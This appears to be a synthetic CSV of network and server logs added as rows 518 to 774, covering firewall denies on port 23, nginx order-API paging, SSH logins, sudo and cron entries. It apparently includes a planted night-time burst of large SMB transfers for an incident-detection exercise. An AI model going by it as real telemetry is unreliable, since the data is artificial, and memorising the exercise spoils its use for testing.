+518,2026-03-13 13:53:10,fw01,firewall,ALLOW tcp 10.20.9.88:55286 -> 10.20.2.22:443 bytes=16806
+519,2026-03-13 13:55:07,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 305"
+520,2026-03-13 14:00:38,fw01,firewall,ALLOW tcp 10.20.9.72:54189 -> 10.20.2.22:443 bytes=3543
+521,2026-03-13 14:30:09,web01,nginx,"198.51.100.42 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+522,2026-03-13 14:56:31,vpn01,sshd,pam_unix(sshd:session): session opened for user monitor by (uid=0)
+523,2026-03-13 15:11:06,fw01,firewall,DENY tcp 203.0.113.7:45415 -> 10.20.1.11:23 bytes=0
+524,2026-03-13 15:11:19,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 307"
+525,2026-03-13 15:18:22,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 516"
+526,2026-03-13 15:22:11,vpn01,sshd,pam_unix(sshd:session): session opened for user tokafor by (uid=0)
+527,2026-03-13 15:24:52,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 490"
+528,2026-03-13 15:32:04,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=16 HTTP/1.1"" 200 6364"
+529,2026-03-13 15:34:45,fs01,systemd,Started Session 4067 of user jmorales.
+530,2026-03-13 15:36:59,vpn01,sshd,Accepted publickey for swilliams from 10.20.9.61 port 53372 ssh2
+531,2026-03-13 15:43:51,app01,systemd,Started Session 5756 of user achen.
+532,2026-03-13 15:53:16,web01,sshd,Accepted publickey for jmorales from 10.20.9.96 port 51634 ssh2
+533,2026-03-13 15:55:08,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 626"
+534,2026-03-13 15:55:31,fw01,firewall,DENY tcp 203.0.113.19:40241 -> 10.20.1.11:23 bytes=0
+535,2026-03-13 16:01:22,app01,sshd,Accepted publickey for achen from 10.20.9.72 port 49278 ssh2
+536,2026-03-13 16:14:10,web01,sshd,pam_unix(sshd:session): session opened for user tokafor by (uid=0)
+537,2026-03-13 16:19:57,fw01,firewall,ALLOW tcp 10.20.9.14:57630 -> 10.20.1.21:443 bytes=38721
+538,2026-03-13 16:27:10,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 480"
+539,2026-03-13 16:30:59,fs01,sshd,pam_unix(sshd:session): session opened for user monitor by (uid=0)
+540,2026-03-13 16:49:13,app01,cron,(achen) CMD (/usr/local/bin/report.sh --daily)
+541,2026-03-13 16:51:09,app02,sshd,pam_unix(sshd:session): session opened for user swilliams by (uid=0)
+542,2026-03-13 17:04:04,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=17 HTTP/1.1"" 200 6032"
+543,2026-03-13 17:13:44,web01,sshd,Failed password for swilliams from 10.20.9.72 port 47181 ssh2
+544,2026-03-13 17:31:55,fw01,firewall,ALLOW tcp 10.20.9.88:54668 -> 10.20.2.21:443 bytes=42525
+545,2026-03-13 17:46:15,vpn01,sshd,Accepted publickey for achen from 10.20.9.88 port 56841 ssh2
+546,2026-03-13 17:48:20,app02,sshd,Failed password for achen from 10.20.9.48 port 43774 ssh2
+547,2026-03-13 18:01:01,vpn01,sshd,Accepted publickey for tokafor from 10.20.9.61 port 44577 ssh2
+548,2026-03-13 18:03:34,web01,sshd,pam_unix(sshd:session): session opened for user monitor by (uid=0)
+549,2026-03-13 18:13:42,fs01,sshd,Accepted publickey for swilliams from 10.20.9.61 port 52068 ssh2
+550,2026-03-13 18:13:43,app01,sshd,pam_unix(sshd:session): session opened for user backup by (uid=0)
+551,2026-03-13 18:23:19,app02,systemd,Started Session 7360 of user achen.
+552,2026-03-13 18:25:44,fw01,firewall,ALLOW tcp 10.20.9.96:46492 -> 10.20.1.11:443 bytes=3068
+553,2026-03-13 18:36:31,vpn01,sshd,Accepted publickey for deploy from 10.20.9.33 port 59577 ssh2
+554,2026-03-13 18:43:31,fw01,firewall,ALLOW tcp 10.20.9.88:59059 -> 10.20.1.11:443 bytes=14068
+555,2026-03-13 18:48:03,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=38 HTTP/1.1"" 200 2190"
+556,2026-03-13 19:12:48,web01,nginx,"198.51.100.42 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+557,2026-03-13 19:40:55,vpn01,sshd,Failed password for achen from 10.20.9.33 port 44235 ssh2
+558,2026-03-13 19:45:42,fw01,firewall,DENY tcp 203.0.113.7:51006 -> 10.20.1.11:23 bytes=0
+559,2026-03-13 20:06:45,web02,sshd,pam_unix(sshd:session): session opened for user deploy by (uid=0)
+560,2026-03-13 20:20:20,app01,sshd,Accepted publickey for tokafor from 10.20.9.14 port 44519 ssh2
+561,2026-03-13 20:30:27,app01,sshd,Accepted publickey for achen from 10.20.9.27 port 41903 ssh2
+562,2026-03-13 20:33:10,web01,sshd,Failed password for jmorales from 10.20.9.27 port 45105 ssh2
+563,2026-03-13 20:34:14,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=24 HTTP/1.1"" 200 2071"
+564,2026-03-13 20:36:14,vpn01,sshd,pam_unix(sshd:session): session opened for user deploy by (uid=0)
+565,2026-03-13 20:52:29,fs01,sshd,Failed password for swilliams from 10.20.9.88 port 47193 ssh2
+566,2026-03-13 20:59:15,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=1 HTTP/1.1"" 200 8426"
+567,2026-03-14 00:19:50,web02,systemd,logrotate.service: Succeeded.
+568,2026-03-14 00:45:17,db01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+569,2026-03-14 01:03:12,web01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+570,2026-03-14 01:21:36,web01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+571,2026-03-14 01:55:48,vpn01,cron,(monitor) CMD (/usr/local/bin/healthcheck --quiet)
+572,2026-03-14 03:21:10,db01,systemd,logrotate.service: Succeeded.
+573,2026-03-14 03:55:50,app01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+574,2026-03-14 04:48:58,db01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+575,2026-03-14 05:35:40,web01,systemd,logrotate.service: Succeeded.
+576,2026-03-14 06:06:08,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=3 HTTP/1.1"" 200 3680"
+577,2026-03-14 06:26:31,app01,sshd,pam_unix(sshd:session): session opened for user achen by (uid=0)
+578,2026-03-14 06:32:51,app02,sshd,pam_unix(sshd:session): session opened for user tokafor by (uid=0)
+579,2026-03-14 06:43:22,app02,sudo,rpatel : TTY=pts/0 ; PWD=/home/rpatel ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+580,2026-03-14 06:54:56,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 647"
+581,2026-03-14 06:59:51,fw01,firewall,ALLOW tcp 10.20.9.33:40475 -> 10.20.1.11:443 bytes=44639
+582,2026-03-14 07:06:16,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=13 HTTP/1.1"" 200 1541"
+583,2026-03-14 07:08:55,app01,sshd,Accepted publickey for deploy from 10.20.9.33 port 41534 ssh2
+584,2026-03-14 07:14:26,web02,sshd,Accepted publickey for jmorales from 10.20.9.14 port 45909 ssh2
+585,2026-03-14 07:15:05,app01,sshd,pam_unix(sshd:session): session opened for user deploy by (uid=0)
+586,2026-03-14 07:16:08,app02,sshd,Accepted publickey for swilliams from 10.20.9.88 port 51160 ssh2
+587,2026-03-14 07:23:33,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=19 HTTP/1.1"" 200 8118"
+588,2026-03-14 07:31:43,web01,sshd,pam_unix(sshd:session): session opened for user backup by (uid=0)
+589,2026-03-14 07:39:06,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 864"
+590,2026-03-14 07:43:37,web01,sshd,Accepted publickey for monitor from 10.20.9.72 port 59762 ssh2
+591,2026-03-14 07:53:06,fw01,firewall,DENY tcp 203.0.113.7:46524 -> 10.20.1.11:23 bytes=0
+592,2026-03-14 08:00:12,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=3 HTTP/1.1"" 200 1202"
+593,2026-03-14 08:01:13,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=16 HTTP/1.1"" 200 5419"
+594,2026-03-14 08:04:51,fs01,sshd,Accepted publickey for jmorales from 10.20.9.27 port 55022 ssh2
+595,2026-03-14 08:07:34,vpn01,cron,(tokafor) CMD (/usr/local/bin/report.sh --daily)
+596,2026-03-14 08:39:24,web01,nginx,"203.0.113.19 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+597,2026-03-14 08:51:45,db01,cron,(jmorales) CMD (/usr/local/bin/report.sh --daily)
+598,2026-03-14 08:55:31,web02,sshd,Accepted publickey for deploy from 10.20.9.33 port 51683 ssh2
+599,2026-03-14 09:09:12,app02,sudo,deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+600,2026-03-14 09:18:37,web02,sudo,rpatel : TTY=pts/0 ; PWD=/home/rpatel ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+601,2026-03-14 09:52:49,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=7 HTTP/1.1"" 200 6519"
+602,2026-03-14 10:15:04,db01,sshd,Accepted publickey for swilliams from 10.20.9.96 port 45224 ssh2
+603,2026-03-14 10:15:09,fs01,sshd,Accepted publickey for rpatel from 10.20.9.61 port 47665 ssh2
+604,2026-03-14 10:33:32,web01,cron,(backup) CMD (/usr/local/bin/report.sh --daily)
+605,2026-03-14 10:45:15,web01,sudo,achen : TTY=pts/0 ; PWD=/home/achen ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+606,2026-03-14 10:53:55,vpn01,cron,(rpatel) CMD (/usr/local/bin/report.sh --daily)
+607,2026-03-14 11:18:49,vpn01,sshd,Accepted publickey for swilliams from 10.20.9.14 port 53795 ssh2
+608,2026-03-14 11:20:31,app01,cron,(rpatel) CMD (/usr/local/bin/report.sh --daily)
+609,2026-03-14 11:30:59,web02,sshd,Accepted publickey for achen from 10.20.9.33 port 40741 ssh2
+610,2026-03-14 11:32:15,web02,sudo,achen : TTY=pts/0 ; PWD=/home/achen ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+611,2026-03-14 11:35:10,web01,nginx,"203.0.113.19 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+612,2026-03-14 11:40:27,app01,sudo,achen : TTY=pts/0 ; PWD=/home/achen ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+613,2026-03-14 11:48:12,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=13 HTTP/1.1"" 200 5180"
+614,2026-03-14 11:52:32,vpn01,sshd,pam_unix(sshd:session): session opened for user jmorales by (uid=0)
+615,2026-03-14 12:05:19,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=25 HTTP/1.1"" 200 8164"
+616,2026-03-14 12:17:47,web01,cron,(tokafor) CMD (/usr/local/bin/report.sh --daily)
+617,2026-03-14 12:18:52,vpn01,cron,(monitor) CMD (/usr/local/bin/report.sh --daily)
+618,2026-03-14 12:33:01,web01,nginx,"203.0.113.7 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+619,2026-03-14 12:52:01,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=10 HTTP/1.1"" 200 5035"
+620,2026-03-14 12:59:41,vpn01,systemd,Started Session 1834 of user swilliams.
+621,2026-03-14 13:24:51,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=29 HTTP/1.1"" 200 2351"
+622,2026-03-14 13:26:28,web02,sshd,Accepted publickey for backup from 10.20.9.96 port 55279 ssh2
+623,2026-03-14 13:36:55,fs01,sshd,Accepted publickey for jmorales from 10.20.9.14 port 48065 ssh2
+624,2026-03-14 13:41:31,web01,systemd,Started Session 2571 of user monitor.
+625,2026-03-14 13:46:38,db01,cron,(swilliams) CMD (/usr/local/bin/report.sh --daily)
+626,2026-03-14 13:49:22,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=34 HTTP/1.1"" 200 8418"
+627,2026-03-14 13:53:42,vpn01,sshd,Accepted publickey for rpatel from 10.20.9.33 port 43881 ssh2
+628,2026-03-14 14:11:59,app01,sshd,pam_unix(sshd:session): session opened for user achen by (uid=0)
+629,2026-03-14 14:57:35,vpn01,sshd,Failed password for swilliams from 10.20.9.88 port 57282 ssh2
+630,2026-03-14 14:59:46,app01,sudo,tokafor : TTY=pts/0 ; PWD=/home/tokafor ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+631,2026-03-14 15:04:59,db01,sshd,Accepted publickey for tokafor from 10.20.9.72 port 55020 ssh2
+632,2026-03-14 15:17:47,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 744"
+633,2026-03-14 15:53:46,db01,sshd,Accepted publickey for deploy from 10.20.9.33 port 54661 ssh2
+634,2026-03-14 15:54:57,web02,sudo,jmorales : TTY=pts/0 ; PWD=/home/jmorales ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+635,2026-03-14 15:59:49,web01,sudo,jmorales : TTY=pts/0 ; PWD=/home/jmorales ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+636,2026-03-14 16:11:21,web01,cron,(deploy) CMD (/usr/local/bin/report.sh --daily)
+637,2026-03-14 16:15:03,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=20 HTTP/1.1"" 200 5000"
+638,2026-03-14 16:16:50,web01,systemd,Started Session 1505 of user backup.
+639,2026-03-14 16:29:11,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 780"
+640,2026-03-14 16:36:19,app01,sshd,Accepted publickey for backup from 10.20.9.14 port 49171 ssh2
+641,2026-03-14 16:50:37,web01,nginx,"198.51.100.42 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+642,2026-03-14 16:50:52,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 613"
+643,2026-03-14 17:04:17,web02,systemd,Started Session 2100 of user rpatel.
+644,2026-03-14 17:08:22,web02,sudo,monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+645,2026-03-14 17:08:22,vpn01,sshd,Accepted publickey for tokafor from 10.20.9.33 port 50143 ssh2
+646,2026-03-14 17:10:59,app01,sshd,Accepted publickey for backup from 10.20.9.14 port 41437 ssh2
+647,2026-03-14 17:21:08,app01,sshd,Accepted publickey for jmorales from 10.20.9.88 port 56490 ssh2
+648,2026-03-14 17:50:05,fw01,firewall,DENY tcp 203.0.113.7:41111 -> 10.20.1.11:23 bytes=0
+649,2026-03-14 18:22:46,fw01,firewall,DENY tcp 198.51.100.42:58268 -> 10.20.1.11:23 bytes=0
+650,2026-03-14 18:31:52,web01,sshd,Accepted publickey for tokafor from 10.20.9.72 port 44325 ssh2
+651,2026-03-14 18:35:20,vpn01,sshd,Failed password for tokafor from 10.20.9.14 port 46122 ssh2
+652,2026-03-14 18:51:23,fw01,firewall,ALLOW tcp 10.20.9.61:42216 -> 10.20.3.55:443 bytes=46327
+653,2026-03-14 19:06:39,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 242"
+654,2026-03-14 19:12:36,app02,sshd,Accepted publickey for backup from 10.20.9.96 port 56953 ssh2
+655,2026-03-14 19:15:11,web01,sshd,Failed password for tokafor from 10.20.9.33 port 54361 ssh2
+656,2026-03-14 19:20:42,db01,sshd,pam_unix(sshd:session): session opened for user backup by (uid=0)
+657,2026-03-14 19:22:02,fs01,sshd,Accepted publickey for tokafor from 10.20.9.33 port 58755 ssh2
+658,2026-03-14 19:29:05,fs01,sudo,monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+659,2026-03-14 19:29:20,web01,sshd,pam_unix(sshd:session): session opened for user monitor by (uid=0)
+660,2026-03-14 19:32:40,app02,systemd,Started Session 5836 of user swilliams.
+661,2026-03-14 19:35:28,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 611"
+662,2026-03-14 19:44:24,fs01,sshd,Accepted publickey for deploy from 10.20.9.33 port 58774 ssh2
+663,2026-03-14 19:51:15,web01,nginx,"203.0.113.7 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+664,2026-03-14 19:55:53,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=30 HTTP/1.1"" 200 7519"
+665,2026-03-14 20:09:42,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=28 HTTP/1.1"" 200 1124"
+666,2026-03-14 20:17:31,fw01,firewall,DENY tcp 203.0.113.7:54219 -> 10.20.1.11:23 bytes=0
+667,2026-03-14 20:18:45,web02,cron,(swilliams) CMD (/usr/local/bin/report.sh --daily)
+668,2026-03-14 20:19:17,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 378"
+669,2026-03-14 20:24:09,fw01,firewall,ALLOW tcp 10.20.9.33:49552 -> 10.20.2.40:443 bytes=6716
+670,2026-03-14 20:26:24,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 543"
+671,2026-03-15 00:07:26,vpn01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+672,2026-03-15 00:31:21,web01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+673,2026-03-15 00:52:33,fw01,firewall,ALLOW tcp 10.20.1.12:56038 -> 10.20.2.40:445 bytes=21472990
+674,2026-03-15 01:21:43,web02,sshd,Accepted publickey for deploy from 10.20.2.21 port 58923 ssh2
+675,2026-03-15 01:38:20,fw01,firewall,ALLOW tcp 10.20.2.21:44759 -> 10.20.2.40:445 bytes=10466709
+676,2026-03-15 01:48:05,fw01,firewall,ALLOW tcp 10.20.1.11:45477 -> 10.20.2.40:445 bytes=20436964
+677,2026-03-15 03:24:16,db01,sshd,Accepted publickey for backup from 10.20.2.40 port 40746 ssh2
+678,2026-03-15 03:42:55,web01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+679,2026-03-15 05:18:28,app02,sudo,deploy : TTY=pts/3 ; PWD=/opt/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app.service
+680,2026-03-15 06:04:35,fs01,cron,(jmorales) CMD (/usr/local/bin/report.sh --daily)
+681,2026-03-15 06:20:39,fw01,firewall,ALLOW tcp 10.20.9.27:41727 -> 10.20.3.55:443 bytes=29968
+682,2026-03-15 06:50:48,fs01,sshd,Accepted publickey for rpatel from 10.20.9.88 port 44376 ssh2
+683,2026-03-15 06:56:13,web01,nginx,"203.0.113.7 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+684,2026-03-15 06:56:23,fw01,firewall,DENY tcp 203.0.113.19:40495 -> 10.20.1.11:23 bytes=0
+685,2026-03-15 07:05:38,app01,sshd,Failed password for achen from 10.20.9.88 port 53837 ssh2
+686,2026-03-15 07:18:50,web02,sshd,Accepted publickey for deploy from 10.20.9.88 port 47211 ssh2
+687,2026-03-15 07:34:31,db01,sshd,Failed password for tokafor from 10.20.9.72 port 55063 ssh2
+688,2026-03-15 07:49:38,fw01,firewall,ALLOW tcp 10.20.9.88:49910 -> 10.20.1.21:443 bytes=24140
+689,2026-03-15 07:50:24,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=30 HTTP/1.1"" 200 5895"
+690,2026-03-15 08:15:29,app02,systemd,Started Session 1544 of user swilliams.
+691,2026-03-15 08:33:02,app01,sshd,pam_unix(sshd:session): session opened for user tokafor by (uid=0)
+692,2026-03-15 08:35:15,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=28 HTTP/1.1"" 200 5017"
+693,2026-03-15 08:59:50,fw01,firewall,ALLOW tcp 10.20.9.27:53278 -> 10.20.1.12:443 bytes=15612
+694,2026-03-15 09:08:59,web01,nginx,"203.0.113.7 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+695,2026-03-15 09:23:24,app02,sshd,Accepted publickey for deploy from 10.20.9.27 port 46298 ssh2
+696,2026-03-15 09:41:25,web01,sshd,Accepted publickey for swilliams from 10.20.9.61 port 50427 ssh2
+697,2026-03-15 09:41:42,app02,systemd,Started Session 5850 of user swilliams.
+698,2026-03-15 09:49:45,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 389"
+699,2026-03-15 10:04:45,vpn01,sshd,pam_unix(sshd:session): session opened for user rpatel by (uid=0)
+700,2026-03-15 10:08:09,fw01,firewall,DENY tcp 198.51.100.42:45975 -> 10.20.1.11:23 bytes=0
+701,2026-03-15 10:11:34,db01,sudo,achen : TTY=pts/0 ; PWD=/home/achen ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+702,2026-03-15 10:13:21,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 373"
+703,2026-03-15 10:14:49,fw01,firewall,DENY tcp 203.0.113.7:50063 -> 10.20.1.11:23 bytes=0
+704,2026-03-15 10:24:08,vpn01,sshd,pam_unix(sshd:session): session opened for user deploy by (uid=0)
+705,2026-03-15 10:28:32,app01,sshd,pam_unix(sshd:session): session opened for user jmorales by (uid=0)
+706,2026-03-15 10:40:40,fs01,sshd,Accepted publickey for monitor from 10.20.9.96 port 59615 ssh2
+707,2026-03-15 10:44:04,fw01,firewall,ALLOW tcp 10.20.9.61:50682 -> 10.20.1.11:443 bytes=7316
+708,2026-03-15 10:45:35,web01,cron,(monitor) CMD (/usr/local/bin/report.sh --daily)
+709,2026-03-15 10:54:32,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=6 HTTP/1.1"" 200 2522"
+710,2026-03-15 10:58:35,fw01,firewall,DENY tcp 203.0.113.19:54087 -> 10.20.1.11:23 bytes=0
+711,2026-03-15 11:03:17,fs01,sshd,pam_unix(sshd:session): session opened for user jmorales by (uid=0)
+712,2026-03-15 11:21:44,web01,cron,(tokafor) CMD (/usr/local/bin/report.sh --daily)
+713,2026-03-15 11:40:24,web02,sshd,Accepted publickey for backup from 10.20.9.88 port 55694 ssh2
+714,2026-03-15 11:43:48,web01,nginx,"198.51.100.42 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+715,2026-03-15 12:14:48,web01,nginx,"198.51.100.42 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+716,2026-03-15 12:18:38,fw01,firewall,DENY tcp 198.51.100.42:49757 -> 10.20.1.11:23 bytes=0
+717,2026-03-15 12:36:12,fw01,firewall,ALLOW tcp 10.20.9.72:54332 -> 10.20.2.21:443 bytes=41655
+718,2026-03-15 13:11:20,app02,sshd,Accepted publickey for jmorales from 10.20.9.33 port 44958 ssh2
+719,2026-03-15 13:18:34,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=28 HTTP/1.1"" 200 6914"
+720,2026-03-15 13:18:36,web02,cron,(swilliams) CMD (/usr/local/bin/report.sh --daily)
+721,2026-03-15 13:22:36,fw01,firewall,ALLOW tcp 10.20.9.48:50877 -> 10.20.1.11:443 bytes=23035
+722,2026-03-15 13:33:48,fw01,firewall,DENY tcp 203.0.113.19:47787 -> 10.20.1.11:23 bytes=0
+723,2026-03-15 13:44:07,web02,cron,(tokafor) CMD (/usr/local/bin/report.sh --daily)
+724,2026-03-15 13:45:26,db01,sshd,pam_unix(sshd:session): session opened for user monitor by (uid=0)
+725,2026-03-15 13:46:10,web02,sshd,Accepted publickey for deploy from 10.20.9.48 port 59800 ssh2
+726,2026-03-15 13:49:53,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 369"
+727,2026-03-15 13:59:24,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=32 HTTP/1.1"" 200 2864"
+728,2026-03-15 14:00:07,web02,sshd,Accepted publickey for rpatel from 10.20.9.61 port 46177 ssh2
+729,2026-03-15 14:06:15,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=7 HTTP/1.1"" 200 5505"
+730,2026-03-15 14:30:06,web02,sshd,Accepted publickey for swilliams from 10.20.9.14 port 55744 ssh2
+731,2026-03-15 14:31:26,fw01,firewall,DENY tcp 203.0.113.19:46315 -> 10.20.1.11:23 bytes=0
+732,2026-03-15 14:34:12,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=31 HTTP/1.1"" 200 4668"
+733,2026-03-15 14:36:07,db01,sshd,pam_unix(sshd:session): session opened for user rpatel by (uid=0)
+734,2026-03-15 14:37:38,db01,systemd,Started Session 4527 of user backup.
+735,2026-03-15 14:52:24,fw01,firewall,DENY tcp 203.0.113.19:53483 -> 10.20.1.11:23 bytes=0
+736,2026-03-15 15:17:47,vpn01,sshd,pam_unix(sshd:session): session opened for user backup by (uid=0)
+737,2026-03-15 15:38:22,fw01,firewall,ALLOW tcp 10.20.9.33:45077 -> 10.20.2.21:443 bytes=20370
+738,2026-03-15 15:52:10,db01,sshd,pam_unix(sshd:session): session opened for user backup by (uid=0)
+739,2026-03-15 16:31:12,app01,sshd,Accepted publickey for swilliams from 10.20.9.48 port 56698 ssh2
+740,2026-03-15 16:36:11,web01,sshd,pam_unix(sshd:session): session opened for user swilliams by (uid=0)
+741,2026-03-15 16:45:26,web01,nginx,"203.0.113.7 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+742,2026-03-15 16:47:11,web01,sshd,Accepted publickey for jmorales from 10.20.9.27 port 57464 ssh2
+743,2026-03-15 16:54:08,vpn01,systemd,Started Session 7688 of user monitor.
+744,2026-03-15 16:55:47,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 324"
+745,2026-03-15 17:10:03,web01,nginx,"198.51.100.42 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+746,2026-03-15 17:14:45,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=3 HTTP/1.1"" 200 1418"
+747,2026-03-15 17:19:42,web01,sshd,pam_unix(sshd:session): session opened for user backup by (uid=0)
+748,2026-03-15 17:20:59,db01,cron,(jmorales) CMD (/usr/local/bin/report.sh --daily)
+749,2026-03-15 17:25:07,fw01,firewall,ALLOW tcp 10.20.9.96:52992 -> 10.20.2.21:443 bytes=44014
+750,2026-03-15 17:43:22,web02,sudo,swilliams : TTY=pts/0 ; PWD=/home/swilliams ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+751,2026-03-15 17:56:14,web01,sshd,Failed password for swilliams from 10.20.9.27 port 47969 ssh2
+752,2026-03-15 17:59:34,fw01,firewall,DENY tcp 198.51.100.42:46786 -> 10.20.1.11:23 bytes=0
+753,2026-03-15 18:14:15,vpn01,sshd,Accepted publickey for rpatel from 10.20.9.72 port 55562 ssh2
+754,2026-03-15 18:24:19,web01,nginx,"203.0.113.19 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+755,2026-03-15 18:41:23,app02,sudo,achen : TTY=pts/0 ; PWD=/home/achen ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+756,2026-03-15 18:42:04,web01,nginx,"198.51.100.42 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+757,2026-03-15 18:54:54,fw01,firewall,DENY tcp 203.0.113.7:51685 -> 10.20.1.11:23 bytes=0
+758,2026-03-15 18:58:45,fw01,firewall,ALLOW tcp 10.20.9.61:49347 -> 10.20.1.11:443 bytes=13753
+759,2026-03-15 19:08:31,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 308"
+760,2026-03-15 19:09:02,web01,nginx,"203.0.113.19 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+761,2026-03-15 19:09:05,vpn01,sshd,Accepted publickey for swilliams from 10.20.9.96 port 55912 ssh2
+762,2026-03-15 19:13:07,web02,sudo,rpatel : TTY=pts/0 ; PWD=/home/rpatel ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+763,2026-03-15 19:14:59,fw01,firewall,DENY tcp 198.51.100.42:50861 -> 10.20.1.11:23 bytes=0
+764,2026-03-15 19:18:08,app02,systemd,Started Session 6838 of user swilliams.
+765,2026-03-15 19:27:01,web01,sshd,pam_unix(sshd:session): session opened for user monitor by (uid=0)
+766,2026-03-15 19:44:03,app02,sshd,pam_unix(sshd:session): session opened for user deploy by (uid=0)
+767,2026-03-15 19:54:34,db01,cron,(tokafor) CMD (/usr/local/bin/report.sh --daily)
+768,2026-03-15 20:10:15,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 851"
+769,2026-03-15 20:23:06,web02,sshd,Accepted publickey for achen from 10.20.9.96 port 59625 ssh2
+770,2026-03-15 20:24:12,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 506"
+771,2026-03-15 20:25:11,vpn01,cron,(monitor) CMD (/usr/local/bin/report.sh --daily)
+772,2026-03-15 20:30:24,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 701"
+773,2026-03-15 20:32:55,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=33 HTTP/1.1"" 200 1949"
+774,2026-03-15 20:33:00,web01,sshd,Accepted publickey for backup from 10.20.9.61 port 41199 ssh2
